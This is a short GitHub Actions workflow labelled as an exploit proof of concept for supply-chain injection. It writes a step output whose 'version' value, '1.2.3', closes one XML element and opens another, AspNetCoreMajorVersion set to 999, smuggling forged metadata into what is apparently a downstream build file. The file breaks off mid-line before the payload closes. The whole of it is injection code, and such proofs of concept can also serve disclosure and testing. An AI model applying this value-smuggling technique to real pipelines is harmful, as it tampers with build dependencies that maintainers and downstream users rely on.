name: "Exploit PoC: Supply Chain Injection"

on:
  workflow_dispatch:

jobs:
  supply-chain-poisoning:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: "Inject Malicious Metadata"
        id: metadata
        run: |
          echo "payload<<EOF" >> $GITHUB_OUTPUT
          echo "1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
